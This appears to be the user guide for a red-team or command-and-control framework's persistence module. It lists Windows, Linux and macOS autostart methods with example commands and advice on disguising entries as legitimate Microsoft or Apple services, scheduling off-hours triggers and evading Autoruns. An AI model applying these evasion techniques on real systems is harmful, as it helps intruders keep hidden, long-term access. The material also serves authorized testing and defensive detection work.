# Persistence

Install and remove persistence mechanisms to survive reboots and maintain long-term access.

---

## Why Persistence?

An agent process terminates when the machine reboots, a user logs off, or the process is killed. Persistence ensures the agent restarts automatically. The method you choose depends on:
- **Privilege level** — some methods require admin/SYSTEM
- **Trigger** — user logon, system boot, scheduled time, event
- **Stealth** — how visible it is in the registry, task scheduler, etc.
- **Platform** — Windows, Linux, or macOS

---

## Installing Persistence

```
❯ persistence setup <agent-id> --method <method> [--name <name>] [--path <exe-path>]
```

The `--name` uniquely identifies this persistence entry (used for removal). If omitted, a random name is generated. The `--path` specifies what to execute — defaults to the agent's own process path.

---

## Windows Methods

### `registry_run` — HKCU Run Key

Adds a value to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. Triggers on **user logon**. Does not require admin.

```
❯ persistence setup a1b2 \
    --method registry_run \
    --name "WindowsUpdate" \
    --path "C:\Users\jsmith\AppData\Local\svchost.exe"
[*] Setting up registry_run persistence 'WindowsUpdate' on agent a1b2c3d4...
[+] Persistence 'WindowsUpdate' setup successfully
```

**Use case:** Low-privilege, targeted at a specific user's logon. If the user account is the target (not admin), this is often the most reliable method.

**Visibility:** Easily found by `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run` or Autoruns. Use a realistic name and path.

**Removal:**
```
❯ persistence remove a1b2 --method registry_run --name "WindowsUpdate"
```

---

### `schtasks_onlogon` — Scheduled Task on Logon

Creates a scheduled task that triggers when any user logs in. Survives across sessions.

```
❯ persistence setup a1b2 \
    --method schtasks_onlogon \
    --name "MicrosoftEdgeUpdate" \
    --path "C:\Windows\Temp\MicrosoftEdgeUpdate.exe"
```

**Use case:** More flexible than Run key — can run under any user context or SYSTEM. Requires local admin for SYSTEM-level tasks.

**Visibility:** Listed in Task Scheduler (`schtasks /query /fo LIST /v`). Name it after a legitimate Microsoft task.

---

### `schtasks_daily` — Scheduled Task on Schedule

Triggers at a specific time daily.

```
❯ persistence setup a1b2 \
    --method schtasks_daily \
    --name "SystemHealthCheck" \
    --path "C:\Windows\Temp\svc.exe" \
    --args "--time 02:30"
```

**Use case:** When you want beacon activity only at specific times (combine with a working-hours profile). A 2:30 AM trigger when no one's watching.

---

### `startup_folder` — Startup Folder

Drops a shortcut or script into the user's `Startup` folder (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`). Triggers on user logon. No admin required.

```
❯ persistence setup a1b2 \
    --method startup_folder \
    --name "OneDriveHelper" \
    --path "C:\Users\jsmith\AppData\Local\OneDriveHelper.exe"
```

**Use case:** Most primitive method — highly visible to Autoruns and incident responders. Use only as a last resort or when stealth is not a concern.

---

### WMI Event Subscription (Advanced)

Uses WMI permanent event subscriptions — one of the stealthiest persistence methods on Windows. Survives Autoruns and standard cleanup tools.

```
❯ persistence setup a1b2 --method wmi_subscription --name "SystemCacheMgr"
```

**How it works internally:** Creates a WMI `__EventFilter` (trigger condition), `CommandLineEventConsumer` (what to run), and `FilterToConsumerBinding` (ties them together). The WMI service itself triggers the payload — no new scheduled task or registry key.

**Use case:** High-stealth persistence on targets with aggressive monitoring of Run keys and Task Scheduler. Requires admin.

**Detection:** `Get-WMIObject -Namespace root\subscription -Class __EventFilter` in PowerShell, or tools like `WMIPersist` scanner. Not visible in Task Scheduler or Autoruns by default.

---

## Linux Methods

### `cron_reboot` — Cron on Reboot

Adds `@reboot /path/to/agent` to the user's crontab.

```
❯ persistence setup a1b2 --method cron_reboot --path "/home/user/.local/bin/agent"
```

### `systemd_user` — Systemd User Service

Creates a user-level systemd unit file that starts on login.

```
❯ persistence setup a1b2 --method systemd_user --name "dbus-agent"
```

### `bashrc` — Shell Profile

Appends a line to `~/.bashrc` (or `~/.zshrc`, `~/.profile`) that launches the agent on interactive shell start.

```
❯ persistence setup a1b2 --method bashrc
```

**Use case:** Lowest stealth — but works reliably for user sessions.

---

## macOS Methods

### `launchagent` — LaunchAgent plist

Creates a LaunchAgent property list in `~/Library/LaunchAgents/` that starts the agent on user login.

```
❯ persistence setup a1b2 --method launchagent --name "com.apple.updates"
```

---

## Removing Persistence

Always clean up at the end of an engagement.

```
❯ persistence remove a1b2 --method registry_run --name "WindowsUpdate"
[*] Removing registry_run persistence 'WindowsUpdate' from agent a1b2c3d4...
[+] Persistence 'WindowsUpdate' removed successfully
[*] Agent persistence has been cleaned up.
```

---

## Choosing the Right Method

| Scenario | Recommended Method |
|----------|-------------------|
| No admin, targeting user sessions | `registry_run`, `startup_folder`, `bashrc` |
| Admin, need resilience | `schtasks_onlogon` with SYSTEM context |
| Maximum stealth, admin available | `wmi_subscription` |
| Quiet time trigger | `schtasks_daily` at off-hours |
| Linux target | `systemd_user` (clean) or `cron_reboot` (simple) |
| macOS target | `launchagent` |
